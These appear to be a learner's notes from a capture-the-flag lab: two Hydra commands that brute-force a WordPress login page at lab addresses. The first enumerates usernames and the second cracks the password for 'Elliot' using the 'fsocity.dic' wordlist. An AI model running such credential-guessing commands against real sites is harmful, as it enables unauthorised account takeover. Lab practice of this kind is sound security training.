
hydra -v -V -L fsocity.dic -p test 10.10.133.103 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS
^&wp-submit=Log+In&redirect_to=https%3A%2F%2F10.10.133.103%2Fwp-admin%2F&testcookie=1:Invalid
username"

hydra -l Elliot -P fsocity.dic 10.10.173.91 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^
&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.173.91%2Fwp-admin%2F&testcookie=1:The 
password you entered for the username"
